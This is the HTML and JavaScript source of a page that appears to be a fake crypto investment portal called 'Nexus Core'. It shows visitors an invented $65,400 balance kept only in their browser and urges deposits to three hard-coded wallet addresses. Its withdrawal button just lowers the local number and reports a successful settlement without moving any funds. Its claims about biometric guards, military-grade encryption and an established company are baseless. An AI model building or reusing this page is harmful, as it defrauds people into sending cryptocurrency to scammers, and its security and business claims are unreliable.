<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS CORE | Elite Asset Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        :root { --gold: #f3ba2f; --bg: #010204; }
        body { background-color: var(--bg); color: #ffffff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(15, 18, 23, 0.9); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.06); }
        .sidebar { transform: translateX(100%); transition: 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .sidebar.active { transform: translateX(0); }
        .crypto-text { background: linear-gradient(90deg, #f3ba2f, #ffffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hidden-section { display: none; }
        input { background: #0d1117 !important; border: 1px solid #21262d !important; color: white !important; outline: none !important; border-radius: 12px; }
        input:focus { border-color: var(--gold) !important; }
        .ping { height: 8px; width: 8px; border-radius: 50%; background: #10b981; display: inline-block; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.5); opacity: 0.3; } 100% { transform: scale(1); opacity: 1; } }
    </style>
</head>
<body>

    <nav class="glass sticky top-0 z-[100] px-6 py-5 flex items-center justify-between border-b border-white/5">
        <div class="flex items-center gap-3 cursor-pointer" onclick="location.reload()">
            <div class="w-10 h-10 bg-[#f3ba2f] rounded-xl flex items-center justify-center font-black text-black text-xl shadow-2xl">N</div>
            <span class="text-xl font-black italic tracking-tighter uppercase">Nexus<span class="crypto-text">Core</span></span>
        </div>
        
        <div class="flex items-center gap-4">
            <div id="user-tag" class="hidden text-right hidden sm:block">
                <p id="user-name-display" class="text-[10px] font-black text-[#f3ba2f] uppercase"></p>
                <p class="text-[8px] text-green-500 font-bold tracking-widest">NETWORK: ACTIVE</p>
            </div>
            <button onclick="toggleMenu()" class="w-10 h-10 flex flex-col items-center justify-center gap-1.5 glass rounded-full hover:scale-110 transition">
                <div class="w-5 h-0.5 bg-white"></div>
                <div class="w-5 h-0.5 bg-white"></div>
                <div class="w-5 h-0.5 bg-white"></div>
            </button>
        </div>
    </nav>

    <div id="sidebar-menu" class="sidebar fixed top-0 right-0 h-full w-full max-w-xs glass z-[200] p-10 shadow-2xl">
        <div class="flex justify-between items-center mb-12">
            <h3 class="font-black italic uppercase tracking-tighter">Terminal Menu</h3>
            <button onclick="toggleMenu()" class="text-4xl text-gray-500">&times;</button>
        </div>
        <div class="space-y-8">
            <button onclick="showSection('dashboard'); toggleMenu()" class="w-full text-left font-bold text-xs hover:text-[#f3ba2f] transition tracking-widest uppercase">🏠 Dashboard</button>
            <button onclick="showPolicy('history'); toggleMenu()" class="w-full text-left font-bold text-xs hover:text-[#f3ba2f] transition tracking-widest uppercase">📜 Tx Ledger</button>
            <button onclick="showPolicy('company'); toggleMenu()" class="w-full text-left font-bold text-xs hover:text-[#f3ba2f] transition tracking-widest uppercase">🏢 Nexus Info</button>
            <button onclick="showPolicy('privacy'); toggleMenu()" class="w-full text-left font-bold text-xs hover:text-[#f3ba2f] transition tracking-widest uppercase">🛡️ Privacy Protocol</button>
            <button onclick="logout()" class="w-full text-left font-black text-xs text-red-500 mt-20 tracking-widest uppercase">🚪 Exit Node</button>
        </div>
    </div>

    <section id="landing-section" class="section py-32 px-6 text-center animate__animated animate__fadeIn">
        <div class="inline-flex items-center gap-3 bg-white/5 border border-white/10 px-5 py-2 rounded-full mb-10">
            <span class="ping"></span><span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Biometric Guard Active</span>
        </div>
        <h1 class="text-7xl md:text-9xl font-black mb-8 italic tracking-tighter leading-none uppercase">Nexus<br><span class="crypto-text">Global.</span></h1>
        <p class="text-gray-500 max-w-xl mx-auto mb-12 text-sm font-bold uppercase tracking-[0.4em]">The Institutional Grade Web3 Portal</p>
        <button onclick="showSection('auth')" class="bg-[#f3ba2f] text-black px-12 py-5 rounded-2xl font-black text-xl shadow-2xl hover:scale-105 transition">ENTER TERMINAL</button>
    </section>

    <section id="auth-section" class="section hidden-section flex justify-center py-24 px-6 animate__animated animate__zoomIn">
        <div class="glass p-12 rounded-[45px] w-full max-w-md border border-yellow-500/20">
            <h2 class="text-3xl font-black mb-10 italic uppercase">Verify Node</h2>
            <div class="space-y-4">
                <input id="reg-name" type="text" placeholder="Full Legal Name" class="w-full p-4 text-sm">
                <input id="reg-email" type="email" placeholder="Institutional Email" class="w-full p-4 text-sm">
                <button onclick="login()" class="w-full bg-[#f3ba2f] text-black font-black py-4 rounded-xl shadow-xl mt-4 uppercase text-xs tracking-widest">Connect to Network</button>
            </div>
        </div>
    </section>

    <section id="dashboard-section" class="section hidden-section container mx-auto px-6 py-10 animate__animated animate__fadeIn">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-10">
            <div class="lg:col-span-2 glass p-10 rounded-[50px] border-l-8 border-[#f3ba2f]">
                <p class="text-[10px] font-black text-gray-500 uppercase tracking-widest mb-4">Current Asset Valuation</p>
                <h2 id="balance-display" class="text-6xl md:text-8xl font-black italic tracking-tighter mb-12">$0.00</h2>
                <div class="flex gap-4">
                    <button onclick="openModal('deposit')" class="flex-1 bg-[#f3ba2f] text-black py-5 rounded-3xl font-black text-xs uppercase shadow-xl hover:brightness-110">Deposit</button>
                    <button onclick="openModal('withdraw')" class="flex-1 bg-white/5 border border-white/10 py-5 rounded-3xl font-black text-xs uppercase hover:bg-white/10 transition">Withdraw</button>
                </div>
            </div>
            <div class="glass p-8 rounded-[50px] flex flex-col justify-center gap-8">
                <div><p class="text-[9px] font-black text-gray-500 uppercase mb-1">Global Node Rank</p><h3 class="text-3xl font-black text-[#f3ba2f]">#14,502</h3></div>
                <div><p class="text-[9px] font-black text-gray-500 uppercase mb-1">Session Health</p><h3 class="text-3xl font-black text-green-500 uppercase italic">Stable</h3></div>
            </div>
        </div>

        <div class="glass p-8 rounded-[40px] max-w-4xl">
            <h4 class="text-xs font-black uppercase tracking-widest mb-8 flex items-center gap-3">
                <span class="w-2 h-2 bg-[#f3ba2f] rounded-full"></span> Recent Terminal Activity
            </h4>
            <div id="history-box" class="space-y-4">
                <p class="text-xs text-gray-600 italic">No activity detected in current encrypted session.</p>
            </div>
        </div>
    </section>

    <div id="deposit-modal" class="fixed inset-0 z-[300] bg-black/98 backdrop-blur-3xl hidden flex items-center justify-center p-6">
        <div class="glass w-full max-w-lg rounded-[50px] p-12 animate__animated animate__fadeInUp">
            <div class="flex justify-between items-center mb-10">
                <h3 class="text-3xl font-black italic uppercase">Gateway</h3>
                <button onclick="closeModals()" class="text-gray-500 text-4xl">&times;</button>
            </div>
            <div class="flex gap-2 mb-8 overflow-x-auto pb-2">
                <button onclick="setGate('BINANCE')" class="bg-white/5 px-6 py-2 rounded-full text-[10px] font-black border border-white/10 whitespace-nowrap hover:border-[#f3ba2f]">BINANCE</button>
                <button onclick="setGate('METAMASK')" class="bg-white/5 px-6 py-2 rounded-full text-[10px] font-black border border-white/10 whitespace-nowrap hover:border-[#f3ba2f]">METAMASK</button>
                <button onclick="setGate('TRUST')" class="bg-white/5 px-6 py-2 rounded-full text-[10px] font-black border border-white/10 whitespace-nowrap hover:border-[#f3ba2f]">TRUST WALLET</button>
            </div>
            <div class="bg-yellow-500/5 p-6 rounded-3xl border border-yellow-500/20 mb-8">
                <p id="gate-name" class="text-[9px] font-black text-yellow-500 mb-2 uppercase italic tracking-widest">Binance USDT (TRC20):</p>
                <p id="gate-addr" class="text-[11px] font-mono font-bold break-all tracking-tighter text-white">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
            </div>
            <input id="d-amt" type="number" placeholder="Amount (USD)" class="w-full p-5 mb-4 font-black">
            <input id="d-hash" type="text" placeholder="TX Hash / TID" class="w-full p-5 mb-6 text-xs font-mono uppercase">
            <button onclick="confirmDep()" class="w-full bg-[#f3ba2f] text-black font-black py-5 rounded-2xl shadow-xl uppercase text-xs tracking-tighter">Submit to Mainnet</button>
        </div>
    </div>

    <div id="withdraw-modal" class="fixed inset-0 z-[300] bg-black/98 hidden flex items-center justify-center p-6">
        <div class="glass w-full max-w-md rounded-[50px] p-12 animate__animated animate__fadeInDown">
            <h3 class="text-3xl font-black italic mb-10 uppercase text-red-500">Liquidation</h3>
            <input id="w-addr" type="text" placeholder="Destination Wallet Address" class="w-full p-5 mb-4 text-xs font-mono">
            <input id="w-amt" type="number" placeholder="Amount (USD)" class="w-full p-5 mb-8 text-2xl font-black text-center">
            <button onclick="confirmWit()" class="w-full bg-white text-black font-black py-5 rounded-2xl shadow-xl uppercase text-xs tracking-widest">Authorize Extraction</button>
        </div>
    </div>

    <div id="policy-modal" class="fixed inset-0 z-[400] bg-black/98 hidden overflow-y-auto p-10">
        <div class="max-w-2xl mx-auto">
            <div class="flex justify-between items-center mb-10">
                <h2 id="policy-title" class="text-4xl font-black italic uppercase"></h2>
                <button onclick="closePolicy()" class="text-5xl">&times;</button>
            </div>
            <div id="policy-body" class="text-gray-400 space-y-6 italic leading-relaxed text-sm"></div>
        </div>
    </div>

    <script>
        let user = JSON.parse(localStorage.getItem('nexus_user')) || null;
        let balance = parseFloat(localStorage.getItem('nexus_bal')) || 65400.00;
        let history = JSON.parse(localStorage.getItem('nexus_history')) || [];

        function checkAuth() {
            if(user) {
                showSection('dashboard');
                document.getElementById('user-tag').classList.remove('hidden');
                document.getElementById('user-name-display').innerText = user.name;
                updateUI();
            } else {
                showSection('landing');
            }
        }

        function login() {
            const n = document.getElementById('reg-name').value;
            if(!n) return alert("Verify Identity: Legal Name required, sweetie!");
            user = { name: n };
            localStorage.setItem('nexus_user', JSON.stringify(user));
            localStorage.setItem('nexus_bal', balance);
            checkAuth();
        }

        function logout() { localStorage.clear(); location.reload(); }
        function toggleMenu() { document.getElementById('sidebar-menu').classList.toggle('active'); }
        function showSection(id) {
            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden-section'));
            document.getElementById(id + '-section').classList.remove('hidden-section');
            window.scrollTo(0,0);
        }

        function openModal(id) { document.getElementById(id + '-modal').classList.remove('hidden'); }
        function closeModals() { document.querySelectorAll('[id$="-modal"]').forEach(m => m.classList.add('hidden')); }

        function setGate(type) {
            const gn = document.getElementById('gate-name');
            const ga = document.getElementById('gate-addr');
            if(type === 'BINANCE') { 
                gn.innerText = "Binance USDT (TRC20):"; 
                ga.innerText = "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ"; 
            }
            else if(type === 'METAMASK') { 
                gn.innerText = "MetaMask (Ethereum / ERC20):"; 
                ga.innerText = "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355"; 
            }
            else { 
                gn.innerText = "Trust Wallet (TRX / TRC20):"; 
                ga.innerText = "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76"; 
            }
        }

        function confirmDep() {
            const a = document.getElementById('d-amt').value;
            if(!a) return alert("Security: Specify deposit amount!");
            history.unshift({ type: 'DEPOSIT', amt: a, date: new Date().toLocaleString(), status: 'PENDING' });
            localStorage.setItem('nexus_history', JSON.stringify(history));
            alert("Node Broadcasted: Assets are being verified on the mainnet.");
            updateUI(); closeModals();
        }

        function confirmWit() {
            const a = parseFloat(document.getElementById('w-amt').value);
            if(!a || a > balance) return alert("Liquidity Error: Insufficient node balance!");
            balance -= a;
            localStorage.setItem('nexus_bal', balance);
            history.unshift({ type: 'WITHDRAW', amt: a, date: new Date().toLocaleString(), status: 'SETTLED' });
            localStorage.setItem('nexus_history', JSON.stringify(history));
            alert("Settlement Successful: Assets dispatched from Nexus Vault.");
            updateUI(); closeModals();
        }

        function updateUI() {
            document.getElementById('balance-display').innerText = '$' + balance.toLocaleString(undefined, {minimumFractionDigits: 2});
            const box = document.getElementById('history-box');
            if(history.length > 0) {
                box.innerHTML = history.slice(0, 5).map(i => `
                    <div class="flex justify-between border-b border-white/5 py-5 hover:bg-white/5 transition px-2 rounded-xl">
                        <div><p class="text-[10px] font-black text-[#f3ba2f] tracking-widest">${i.type}</p><p class="text-[8px] text-gray-600 font-bold italic mt-1">${i.date}</p></div>
                        <div class="text-right"><p class="text-xs font-mono font-bold">$${parseFloat(i.amt).toLocaleString()}</p><p class="text-[8px] font-black ${i.status === 'PENDING' ? 'text-yellow-500' : 'text-green-500'} tracking-tighter mt-1">${i.status}</p></div>
                    </div>
                `).join('');
            }
        }

        function showPolicy(type) {
            const modal = document.getElementById('policy-modal');
            const title = document.getElementById('policy-title');
            const body = document.getElementById('policy-body');
            modal.classList.remove('hidden');

            if(type === 'privacy') {
                title.innerText = "Privacy Protocol";
                body.innerHTML = "<p>Nexus Core utilizes AES-256 military-grade encryption for all user sessions. No private keys are stored on centralized databases. All asset movements are authorized via secure nodes across the global decentralized network.</p>";
            } else if(type === 'company') {
                title.innerText = "Nexus Elite";
                body.innerHTML = "<p>Established in 2024, Nexus Core Institutional is a leading provider of Web3 asset management and high-frequency liquidity solutions. We bridge the gap between traditional banking and the decentralized future.</p>";
            } else {
                title.innerText = "Global Ledger History";
                body.innerHTML = history.length > 0 ? history.map(i => `<div class='py-4 border-b border-white/5 text-xs font-mono'><span class='text-[#f3ba2f]'>${i.date}</span> | ${i.type} | $${i.amt} | ${i.status}</div>`).join('') : "No encrypted records found.";
            }
        }

        function closePolicy() { document.getElementById('policy-modal').classList.add('hidden'); }

        window.onload = checkAuth;
    </script>
</body>
</html>
